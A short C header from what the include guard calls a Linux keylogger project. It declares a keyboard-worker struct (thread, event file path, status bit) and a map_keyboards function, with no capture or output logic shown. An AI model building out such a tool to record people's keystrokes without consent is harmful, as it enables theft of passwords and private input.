/* kb_mapper.h */
#ifndef LINUX_KEYLOGGER_KB_MAPPER_H
#define LINUX_KEYLOGGER_KB_MAPPER_H

#define KB_WORKER_RUNNING 1
#define KB_WORKER_FAILED  0

struct kb_worker {
    pthread_t *thread;          // The associated thread for the keyboard.
    char      *event_file;      // The event file of the keyboard.
    bool       status: 1;       // The status of the keyboard worker.
};

extern void map_keyboards(void *arg);

#endif
